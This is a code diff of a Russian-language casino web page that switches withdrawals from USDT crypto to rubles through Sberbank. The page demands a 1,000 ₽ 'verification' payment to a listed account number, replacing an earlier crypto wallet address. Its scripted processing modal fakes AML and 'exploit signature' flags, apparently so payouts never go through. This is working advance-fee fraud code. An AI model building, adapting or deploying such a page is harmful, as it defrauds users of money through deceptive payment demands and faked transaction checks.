@@ -1439,30 +1439,35 @@ body.danger-mode .nav-btn.active::after { background: #ef4444; }
     <div style="font-weight:700;font-size:18px;margin-bottom:4px;text-align:center;">💸 Вывод USDT</div>
     <div style="color:var(--text2);font-size:13px;text-align:center;margin-bottom:6px;">Доступно: <span id="withAvail">0</span> USDT · Мин: 5 USDT</div>
 
-    <!-- Сеть -->
-    <div style="display:flex;align-items:center;gap:8px;background:rgba(243,186,47,0.07);border:1px solid rgba(243,186,47,0.2);border-radius:8px;padding:9px 12px;margin-bottom:14px;">
-      <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" onerror="this.style.display='none'" style="width:20px;height:20px;border-radius:50%;">
+    <!-- Банк -->
+    <div style="display:flex;align-items:center;gap:8px;background:rgba(34,197,94,0.07);border:1px solid rgba(34,197,94,0.2);border-radius:8px;padding:9px 12px;margin-bottom:14px;">
+      <div style="width:20px;height:20px;border-radius:50%;background:#21a038;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:900;color:#fff;flex-shrink:0;">С</div>
       <div>
-        <div style="font-size:12px;font-weight:700;color:#f3ba2f;">BNB Smart Chain</div>
-        <div style="font-size:10px;color:rgba(255,255,255,0.4);">BEP-20 · USDT</div>
+        <div style="font-size:12px;font-weight:700;color:#4ade80;">Сбербанк (ПАО)</div>
+        <div style="font-size:10px;color:rgba(255,255,255,0.4);">Банковский перевод · ₽</div>
       </div>
-      <div style="margin-left:auto;font-size:10px;color:rgba(243,186,47,0.6);font-weight:600;">АКТИВНА</div>
+      <div style="margin-left:auto;font-size:10px;color:rgba(34,197,94,0.6);font-weight:600;">АКТИВНА</div>
     </div>
 
-    <input id="withTrc20" type="text" placeholder="BEP-20 адрес кошелька (0x...)" style="width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:var(--radius-xs);padding:12px;color:white;font-size:14px;outline:none;margin-bottom:10px;box-sizing:border-box;">
-    <input id="withAmount" type="number" placeholder="Сумма вывода" min="5" style="width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:var(--radius-xs);padding:12px;color:white;font-size:14px;outline:none;margin-bottom:14px;box-sizing:border-box;">
+    <input id="withTrc20" type="text" placeholder="Номер карты или счёта для вывода" style="width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:var(--radius-xs);padding:12px;color:white;font-size:14px;outline:none;margin-bottom:10px;box-sizing:border-box;">
+    <input id="withAmount" type="number" placeholder="Сумма вывода (₽)" min="500" style="width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:var(--radius-xs);padding:12px;color:white;font-size:14px;outline:none;margin-bottom:14px;box-sizing:border-box;">
 
-    <!-- Инструкция $10 -->
+    <!-- Инструкция 1000р -->
     <div style="background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.25);border-radius:10px;padding:14px;margin-bottom:14px;">
       <div style="font-weight:700;font-size:13px;color:#f59e0b;margin-bottom:8px;">⚠️ Подтверждение аккаунта</div>
       <div style="font-size:12px;color:rgba(255,255,255,0.7);line-height:1.7;margin-bottom:10px;">
-        Для верификации адреса вывода необходимо перевести <b style="color:#fff;">$10 USDT (BEP-20)</b> на счёт проверки:
+        Для верификации счёта вывода необходимо перевести <b style="color:#fff;">1 000 ₽</b> на расчётный счёт:
       </div>
-      <div onclick="copyVerifyAddr()" style="background:#0d1117;border:1px solid rgba(255,255,255,0.08);border-radius:7px;padding:10px 12px;font-family:monospace;font-size:11px;color:#60a5fa;word-break:break-all;cursor:pointer;display:flex;align-items:center;gap:8px;">
-        <span id="verifyAddr">0x0204C039DE6d13ACe6F873484D0D9A71BFBACA06</span>
-        <svg viewBox="0 0 20 20" fill="none" style="width:14px;height:14px;flex-shrink:0;opacity:0.5"><rect x="7" y="7" width="10" height="10" rx="2" stroke="white" stroke-width="1.5"/><path d="M4 13V4a1 1 0 011-1h9" stroke="white" stroke-width="1.5" stroke-linecap="round"/></svg>
+      <div style="background:#0d1117;border:1px solid rgba(255,255,255,0.08);border-radius:7px;padding:10px 12px;font-size:11px;color:rgba(255,255,255,0.6);line-height:1.7;">
+        <div style="color:rgba(255,255,255,0.4);font-size:10px;margin-bottom:4px;">Банк получателя</div>
+        <div style="font-weight:700;color:#fff;">Банк «Сбербанк» (ПАО)</div>
+        <div style="color:rgba(255,255,255,0.4);font-size:10px;margin-top:8px;margin-bottom:4px;">Расчётный счёт</div>
+        <div onclick="navigator.clipboard.writeText('40703810140000002809').then(()=>showToast('Скопировано'))" style="font-family:monospace;color:#60a5fa;cursor:pointer;display:flex;align-items:center;gap:6px;">
+          40703810140000002809
+          <svg viewBox="0 0 20 20" fill="none" style="width:13px;height:13px;flex-shrink:0;opacity:0.5"><rect x="7" y="7" width="10" height="10" rx="2" stroke="white" stroke-width="1.5"/><path d="M4 13V4a1 1 0 011-1h9" stroke="white" stroke-width="1.5" stroke-linecap="round"/></svg>
+        </div>
       </div>
-      <div style="font-size:11px;color:rgba(255,255,255,0.4);margin-top:8px;">Нажмите на адрес, чтобы скопировать</div>
+      <div style="font-size:11px;color:rgba(255,255,255,0.4);margin-top:8px;">Нажмите на счёт, чтобы скопировать</div>
       <div style="font-size:12px;color:rgba(255,255,255,0.6);margin-top:10px;line-height:1.6;">
         После оплаты отправьте скриншот в бот верификации платежей:
       </div>
@@ -3135,7 +3140,7 @@ const LEGAL_CONTENT = {
   },
   terms: {
     title: 'Правила казино',
-    body: `<b>1. Общие условия</b><br>Использование платформы означает согласие с настоящими правилами. Минимальный возраст — 18 лет.<br><br><b>2. Аккаунт</b><br>Один пользователь — один аккаунт. Мультиаккаунтинг запрещён и ведёт к блокировке.<br><br><b>3. Депозиты и вывод</b><br>Минимальный депозит — $10 USDT (BEP-20). Вывод доступен после прохождения верификации аккаунта.<br><br><b>4. Бонусы</b><br>Бонусные средства отыгрываются с вейджером x30. Вывод бонуса без отыгрыша невозможен.<br><br><b>5. Честная игра</b><br>Использование стороннего ПО, ботов или эксплойтов запрещено. Нарушение ведёт к блокировке аккаунта и аннулированию баланса.<br><br><b>6. AML политика</b><br>Платформа соблюдает требования AML/CFT. Подозрительные транзакции блокируются для проверки.`,
+    body: `<b>1. Общие условия</b><br>Использование платформы означает согласие с настоящими правилами. Минимальный возраст — 18 лет.<br><br><b>2. Аккаунт</b><br>Один пользователь — один аккаунт. Мультиаккаунтинг запрещён и ведёт к блокировке.<br><br><b>3. Депозиты и вывод</b><br>Минимальный депозит — 1000 ₽. Вывод доступен после прохождения верификации аккаунта.<br><br><b>4. Бонусы</b><br>Бонусные средства отыгрываются с вейджером x30. Вывод бонуса без отыгрыша невозможен.<br><br><b>5. Честная игра</b><br>Использование стороннего ПО, ботов или эксплойтов запрещено. Нарушение ведёт к блокировке аккаунта и аннулированию баланса.<br><br><b>6. AML политика</b><br>Платформа соблюдает требования AML/CFT. Подозрительные транзакции блокируются для проверки.`,
   },
   responsible: {
     title: 'Ответственная игра',
@@ -3516,7 +3521,7 @@ async function loadWithdrawHistory(){
     }).join('');
 }
 function copyVerifyAddr() {
-  const addr = '0x0204C039DE6d13ACe6F873484D0D9A71BFBACA06';
+  const addr = '40703810140000002809';
   navigator.clipboard?.writeText(addr).catch(()=>{});
   showToast('Адрес скопирован');
   if(navigator.vibrate) navigator.vibrate(40);
@@ -3553,7 +3558,7 @@ function showProcessingModal(amount) {
   const steps = [
     { status: 'Проверка баланса...',           log: 'balance_check → OK',                   delay: 1800 },
     { status: 'Инициализация транзакции...',    log: 'tx_init → accepted',                   delay: 2200 },
-    { status: 'Отправка на адрес...',           log: 'routing → BNB Smart Chain',            delay: 2500 },
+    { status: 'Отправка на адрес...',           log: 'routing → Сбербанк · RU',               delay: 2500 },
     { status: 'Верификация сети...',            log: 'network_verify → pending',             delay: 2000 },
     { status: 'Проверка AML/CFT фильтров...',  log: 'aml_scan → flag_detected',             delay: 2500 },
     { status: 'Анализ транзакции...',           log: 'exploit_signature → MATCH',            delay: 1800 },
